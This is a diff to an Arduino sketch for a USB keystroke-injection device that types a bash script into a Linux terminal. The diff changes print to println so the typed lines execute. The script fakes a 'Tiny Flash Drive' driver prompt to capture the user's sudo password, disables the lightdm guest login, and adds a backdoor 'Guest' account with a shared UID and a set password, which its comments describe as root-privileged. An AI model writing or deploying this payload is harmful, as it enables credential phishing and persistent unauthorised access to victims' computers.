@@ -1,7 +1,7 @@
   
 void setup() {
   Serial.begin(9600);
-  delay(1000);
+  delay(2000);
 }
 
 void loop() {
@@ -20,31 +20,31 @@ void loop() {
   
 
 // #!/bin/bash
-Keyboard.print("echo \"\" > tmp");
-Keyboard.print("stty -echo");
-Keyboard.print("clear");
-Keyboard.print("while :");
-Keyboard.print("do");
-Keyboard.print("   s=$(<tmp)");
-Keyboard.print("   set -- $s");
-Keyboard.print("   if [ -z \"$s\" ]; then");
-Keyboard.print("     : #echo \"file contains $s\"");
-Keyboard.print("   else");
+Keyboard.println("echo \"\" > tmp");
+Keyboard.println("stty -echo");
+Keyboard.println("clear");
+Keyboard.println("while :");
+Keyboard.println("do");
+Keyboard.println("   s=$(<tmp)");
+Keyboard.println("   set -- $s");
+Keyboard.println("   if [ -z \"$s\" ]; then");
+Keyboard.println("     : #echo \"file contains $s\"");
+Keyboard.println("   else");
                      //disable the guest account
-Keyboard.print("     echo $s | sudo -S sh -c 'printf \"[SeatDefaults]\nallow-guest=false\n\" >/usr/share/lightdm/lightdm.conf.d/50-no-guest.conf'");
+Keyboard.println("     echo $s | sudo -S sh -c 'printf \"[SeatDefaults]\nallow-guest=false\n\" >/usr/share/lightdm/lightdm.conf.d/50-no-guest.conf'");
                      // replace it with a new guest account with root privledges
-Keyboard.print("     echo $s | sudo -S useradd -ou 1111 -g 1111 Guest -b /home/Guest");
-Keyboard.print("     echo $s | sudo -S echo \"Guest:hardToGuessPassword\" | chpasswd");
-Keyboard.print("     exit 0");
-Keyboard.print("   fi");
-Keyboard.print("   sleep 0.5");
-Keyboard.print("done &");
-Keyboard.print("stty echo");
-Keyboard.print("echo \"Driver installation for 'Tiny Flash Drive' requires root privledges.\"");
-Keyboard.print("stty -echo");
-Keyboard.print("read -p \"[sudo] password for $USER: \" PASSWORD; echo");
-Keyboard.print("stty echo");
-Keyboard.print("echo \"$PASSWORD\" > tmp");
+Keyboard.println("     echo $s | sudo -S useradd -ou 1111 -g 1111 Guest -b /home/Guest");
+Keyboard.println("     echo $s | sudo -S echo \"Guest:hardToGuessPassword\" | chpasswd");
+Keyboard.println("     exit 0");
+Keyboard.println("   fi");
+Keyboard.println("   sleep 0.5");
+Keyboard.println("done &");
+Keyboard.println("stty echo");
+Keyboard.println("echo \"Driver installation for 'Tiny Flash Drive' requires root privledges.\"");
+Keyboard.println("stty -echo");
+Keyboard.println("read -p \"[sudo] password for $USER: \" PASSWORD; echo");
+Keyboard.println("stty echo");
+Keyboard.println("echo \"$PASSWORD\" > tmp");
 
 delay(300000);
 }
